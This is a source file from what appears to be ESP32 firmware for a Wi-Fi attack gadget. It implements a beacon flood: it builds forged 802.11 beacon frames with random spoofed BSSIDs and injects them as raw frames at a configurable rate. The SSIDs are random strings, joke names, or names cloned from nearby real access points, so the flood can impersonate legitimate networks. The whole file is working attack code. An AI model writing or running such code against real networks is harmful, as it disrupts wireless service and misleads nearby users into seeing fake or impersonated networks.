#include "wifi_attack.h"
#include "attack_common.h"
#include "wifi_scanner.h"
#include <Arduino.h>
#include <esp_wifi.h>
#include <string.h>

// ---------------------------------------------------------------------------
// SSID wordlist
// ---------------------------------------------------------------------------
static const char* s_wordlist[BEACON_WORDLIST_COUNT] = {
    "Free WiFi",
    "FBI Surveillance Van",
    "Pretty Fly for a Wi-Fi",
    "Drop It Like Its Hotspot",
    "The LAN Before Time",
    "Wu-Tang LAN",
    "Router I Hardly Know Her",
    "Bill Wi the Science Fi",
    "LAN Solo",
    "The Promised LAN",
    "Nacho WiFi",
    "Get Off My LAN",
    "It Burns When IP",
    "No More Mr Wi-Fi",
    "Silence of the LANs",
    "Loading...",
    "Searching...",
    "Connecting...",
    "Not Your WiFi",
    "Virus Detected"
};

// ---------------------------------------------------------------------------
// Frame storage
// ---------------------------------------------------------------------------
static BeaconTemplate templates[BEACON_MAX_SSIDS];
static uint8_t        bssids[BEACON_MAX_SSIDS][6];
static char           ssid_list[BEACON_MAX_SSIDS][33];
static uint8_t        active_ssid_count;
static uint32_t       last_tx_ms;
static uint8_t        tx_index;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static void random_mac(uint8_t mac[6]) {
    uint32_t r0 = esp_random();
    uint32_t r1 = esp_random();
    mac[0] = (r0 >>  0) & 0xFF;
    mac[1] = (r0 >>  8) & 0xFF;
    mac[2] = (r0 >> 16) & 0xFF;
    mac[3] = (r1 >>  0) & 0xFF;
    mac[4] = (r1 >>  8) & 0xFF;
    mac[5] = (r1 >> 16) & 0xFF;
    // Set locally-administered bit, clear multicast bit
    mac[0] = (mac[0] | 0x02) & 0xFE;
}

static void generate_random_ssid(char* out, uint8_t max_len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyz"
                                   "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                   "0123456789";
    uint8_t len = 8 + (esp_random() % 5); // 8-12 chars
    if (len >= max_len) len = max_len - 1;
    for (uint8_t i = 0; i < len; i++) {
        out[i] = charset[esp_random() % (sizeof(charset) - 1)];
    }
    out[len] = '\0';
}

static void generate_ssids(uint8_t count, uint8_t source) {
    if (count > BEACON_MAX_SSIDS) count = BEACON_MAX_SSIDS;
    active_ssid_count = count;

    WifiScannerState* scan = scanner_get_state();

    for (uint8_t i = 0; i < count; i++) {
        if (source == 1) {
            // Wordlist (cycle)
            strncpy(ssid_list[i], s_wordlist[i % BEACON_WORDLIST_COUNT], 32);
            ssid_list[i][32] = '\0';
        } else if (source == 2) {
            // Clone from scanner AP list, fall back to random if not enough APs
            if (scan && i < scan->ap_count) {
                strncpy(ssid_list[i], scan->ap_list[i].ssid, 32);
                ssid_list[i][32] = '\0';
            } else {
                generate_random_ssid(ssid_list[i], 33);
            }
        } else {
            // Random (source == 0 or default)
            generate_random_ssid(ssid_list[i], 33);
        }

        // Unique random BSSID per SSID
        random_mac(bssids[i]);
    }
}

static void build_beacon(BeaconTemplate* bt, const char* ssid, uint8_t channel, const uint8_t bssid[6]) {
    uint8_t* f = bt->frame;
    uint8_t  pos = 0;

    // --- MAC header (24 bytes) ---
    // Frame Control: management frame, beacon subtype = 0x80 0x00
    f[pos++] = 0x80; // FC byte 0: type/subtype
    f[pos++] = 0x00; // FC byte 1: flags

    // Duration
    f[pos++] = 0x00;
    f[pos++] = 0x00;

    // Destination: broadcast
    f[pos++] = 0xFF; f[pos++] = 0xFF; f[pos++] = 0xFF;
    f[pos++] = 0xFF; f[pos++] = 0xFF; f[pos++] = 0xFF;

    // Source address = BSSID
    memcpy(&f[pos], bssid, 6); pos += 6;

    // BSSID
    memcpy(&f[pos], bssid, 6); pos += 6;

    // Sequence control (bytes 22-23) — filled in by send_beacon
    f[pos++] = 0x00; // byte 22
    f[pos++] = 0x00; // byte 23

    // --- Fixed parameters (12 bytes) ---
    // Timestamp (8 bytes, set to 0; AP updates this normally)
    for (uint8_t i = 0; i < 8; i++) f[pos++] = 0x00;

    // Beacon interval: 0x0064 (100 TUs) — little-endian
    f[pos++] = 0x64;
    f[pos++] = 0x00;

    // Capability info: 0x0431 — little-endian (0x31 first, then 0x04)
    f[pos++] = 0x31;
    f[pos++] = 0x04;

    // --- Tagged parameters ---

    // Tag 0: SSID
    uint8_t ssid_len = (uint8_t)strnlen(ssid, 32);
    f[pos++] = 0x00;      // tag number
    f[pos++] = ssid_len;  // tag length
    memcpy(&f[pos], ssid, ssid_len); pos += ssid_len;

    // Tag 1: Supported Rates
    f[pos++] = 0x01; // tag number
    f[pos++] = 0x08; // tag length (8 rates)
    f[pos++] = 0x82; f[pos++] = 0x84; f[pos++] = 0x8B; f[pos++] = 0x96;
    f[pos++] = 0x24; f[pos++] = 0x30; f[pos++] = 0x48; f[pos++] = 0x6C;

    // Tag 3: DS Parameter Set (current channel)
    f[pos++] = 0x03; // tag number
    f[pos++] = 0x01; // tag length
    f[pos++] = channel;

    // Tag 48: RSN IE (WPA2-PSK / AES-CCMP), 20 bytes of data
    f[pos++] = 0x30; // tag number (48)
    f[pos++] = 0x14; // tag length (20)
    // RSN version
    f[pos++] = 0x01; f[pos++] = 0x00;
    // Group cipher suite: CCMP (00-0F-AC-04)
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x04;
    // Pairwise cipher suite count
    f[pos++] = 0x01; f[pos++] = 0x00;
    // Pairwise cipher suite: CCMP
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x04;
    // AKM suite count
    f[pos++] = 0x01; f[pos++] = 0x00;
    // AKM suite: PSK (00-0F-AC-02)
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x02;
    // RSN capabilities
    f[pos++] = 0x00; f[pos++] = 0x00;

    bt->frame_len  = pos;
    bt->seq_number = 0;
}

static void send_beacon(BeaconTemplate* bt) {
    bt->seq_number++;
    // Sequence control field: bits [15:4] = seq_num, bits [3:0] = fragment (0)
    uint16_t seq_ctrl = (bt->seq_number & 0x0FFF) << 4;
    bt->frame[22] = (uint8_t)(seq_ctrl & 0xFF);
    bt->frame[23] = (uint8_t)(seq_ctrl >> 8);

    esp_wifi_80211_tx(WIFI_IF_STA, bt->frame, bt->frame_len, false);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void wifi_attack_init() {
    memset(templates, 0, sizeof(templates));
    active_ssid_count = 0;
    tx_index          = 0;
    last_tx_ms        = 0;
}

void wifi_attack_start_beacon_flood() {
    AttackState*      atk  = attack_get_state();
    WifiScannerState* scan = scanner_get_state();

    // Use the channel from scanner state
    uint8_t channel = scan ? scan->current_channel : 6;
    if (channel < 1 || channel > 13) channel = 6;

    // Switch WiFi to the target channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Determine parameters from attack state (use defaults if not configured)
    uint8_t count  = (atk && atk->ssid_count  > 0) ? atk->ssid_count  : BEACON_DEFAULT_COUNT;
    uint8_t source = atk ? atk->ssid_source : 0;

    if (count > BEACON_MAX_SSIDS) count = BEACON_MAX_SSIDS;

    generate_ssids(count, source);

    // Build a beacon frame for each SSID
    for (uint8_t i = 0; i < active_ssid_count; i++) {
        build_beacon(&templates[i], ssid_list[i], channel, bssids[i]);
    }

    tx_index   = 0;
    last_tx_ms = millis();

    Serial.printf("[wifi_attack] beacon flood started: %u SSIDs on ch%u src=%u\n",
                  active_ssid_count, channel, source);
}

void wifi_attack_stop() {
    active_ssid_count = 0;
    tx_index          = 0;
    Serial.println("[wifi_attack] stopped");
}

void wifi_attack_update() {
    AttackState* atk = attack_get_state();
    if (!atk) return;
    if (atk->phase != ATTACK_RUNNING) return;
    if (atk->type  != ATTACK_BEACON_FLOOD) return;
    if (active_ssid_count == 0) return;

    // tx_rate is per-SSID per-second. Total pps = tx_rate * ssid_count.
    // We send one beacon per call (round-robin), so interval = 1000 / total_pps.
    uint16_t rate = (atk->tx_rate > 0) ? atk->tx_rate : BEACON_DEFAULT_RATE;
    uint32_t total_pps = (uint32_t)rate * active_ssid_count;
    if (total_pps > BEACON_MAX_RATE) total_pps = BEACON_MAX_RATE;
    if (total_pps == 0) total_pps = 1;

    uint32_t interval_ms = 1000UL / total_pps;
    if (interval_ms == 0) interval_ms = 1;

    uint32_t now = millis();
    if (now - last_tx_ms < interval_ms) return;
    last_tx_ms = now;

    // Send one beacon in round-robin order
    send_beacon(&templates[tx_index]);
    tx_index = (tx_index + 1) % active_ssid_count;

    atk->stats.packets_sent++;
}
